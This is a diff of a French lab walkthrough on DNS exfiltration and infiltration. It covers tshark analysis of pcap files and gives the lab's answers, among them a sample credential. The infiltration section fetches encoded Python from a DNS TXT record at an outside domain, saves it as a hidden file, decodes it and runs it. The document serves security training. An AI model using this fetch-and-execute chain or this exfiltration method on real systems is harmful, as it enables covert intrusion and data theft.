@@ -88,10 +88,13 @@ Réponse : 253
 
 #### Exfiltration DNS :
 
-TODO : A completer, Le schéma, les instructions du fichier TASK :construction:<br/>
-L'exfiltration DNS est une technique qui consiste à utiliser le DNS pour dérober des données.
+L'exfiltration DNS est une technique qui consiste à utiliser le DNS pour dérober des données.<br/>
 Cette technique est principalement utilisée comme moyen de collecter des informations personnelles telles que les numéros de sécurité sociale, la propriété intellectuelle ou d'autres informations personnellement identifiables.<br/>
 Cela consiste à ajouter des chaînes contenant le « butin » souhaité aux requêtes DNS UDP. La chaîne contenant le butin est alors envoyée à un serveur DNS malveillant qui enregistre ces requêtes. Pour un oeil non averti, cela pourrait ressembler à un trafic DNS normal ou ces demandes pourraient être perdues dans le mélange de nombreuses demandes DNS légitimes.
+
+<p align="center">
+  <img src="https://cdn.discordapp.com/attachments/798799811482353734/807298488881643550/exfil.png"/>
+</p>
 
 Se connecter à la machine cible en SHH en utilisant les crédentials :
 * Utilsateur : user
@@ -110,10 +113,13 @@ $ cd ~/challenges/exfiltration/orderlist
 
 Le .pcap extension de fichier est principalement associée avec Wireshark; un programme utilisé pour l'analyse de réseaux. .pcap fichiers sont des fichiers de données créés en utilisant le programme et ils contiennent les données en paquets d'un réseau. Ces fichiers sont utilisés principalement dans l'analyse des caractéristiques du réseau d'un certain données. Ils contribuent également à contrôler avec succès le trafic d'un certain réseau depuis qu'ils sont surveillés par le programme.
 
-TODO : Que fait cette commande ? :construction:<br/>
-Analysons le fichier order.pcap :
-```
+Analyser le fichier order.pcap et détecter le fichier comportant des requêtes suspectes :
+```console
 $ tshark -r order.pcap -T fields -e dns.qry.name > DNS_names.txt
+```
+
+Le script ~/dns-exfil-infil/packetyGrabber.py permet de decrypter les fichiers Wireshark.
+```console
 $ python3 ~/dns-exfil-infil/packetyGrabber.py
 ```
 
@@ -129,12 +135,11 @@ Quel est le montant de la transaction Firewall ?
 Réponse : 2500
 ```
 
-Aller dans le dossier ci-dessous et lire les instructions dans le fichier TASK :
+Aller dans le dossier ci-dessous :
 ```console
 ~/challenges/exfiltration/identity
 ```
-
-Pour chaque fichier *.pcap
+Parmi les fichiers `*.pcap` analyser leur contenu :
 ```console
 tshark -r cap1.pcap -T fields -e dns.qry.name
 ```
@@ -148,7 +153,7 @@ Réponse : cap3.pcap
 python3 ~/dns-exfil-infil/packetyGrabber.py
 ```
 
-Renseigner les texte après avoir décodé les données en utilisant le programe Pyhton packetyGrabber.py qui se trouve dans le dossier `~/dns-exfil-infil/`.
+Trouver le texte récupéré après avoir décodé les données en utilisant le programe Pyhton packetyGrabber.py qui se trouve dans le dossier `~/dns-exfil-infil/`.
 ```console
 Réponse : administrator:s3cre7P@ssword
 ```
@@ -157,21 +162,25 @@ Réponse : administrator:s3cre7P@ssword
 
 #### Infiltration DNS :
 
-TODO : A completer, Le schéma, les instructions du fichier TASK :construction:<br/>
 L'infiltration DNS est une autre technique d'attaque qui exploite les vulnérabilités des DNS. Cette technique passe par un code malveillant qui est exécuté pour manipuler les serveurs DNS soit à l'aide de systèmes automatisés qui permettent aux attaquants de se connecter à distance à l'infrastructure réseau, soit à l'aide de programme frauduleux.<br/>
 Le but étant souvent de supprimer des fichiers ou d'exécuter du code sur les machines ciblées.
 
-Lire les instructions dans le fichier : 
-```console
-$ cat ~/challenges/infiltration/TASK
-```
+<p align="center">
+  <img src="https://cdn.discordapp.com/attachments/798799811482353734/807297515518427197/infil.png"/>
+</p>
 
+Récupérer un enregistrement au format TXT du sous-domaine `code` du domaine `badbaddoma.in` : 
 ```console
 $ nslookup -type=txt code.badbaddoma.in | grep Ye | cut -d \" -f2 > .mal.py
-
-$ python3 ~/dns-exfil-infil/packetySimple.py
-
-$ python3 .mal.py
 ```
 
+Le contenu représente du code python crypté.<br/>
+Décrypter le contenu avec le script python ~/dns-exfil-infil/packetySimple.py :
+```console
+$ python3 ~/dns-exfil-infil/packetySimple.py
+```
+
+Exécuter le script et afficher le résultat :
+```console
 Réponse : 4.4.0-186-generic
+```
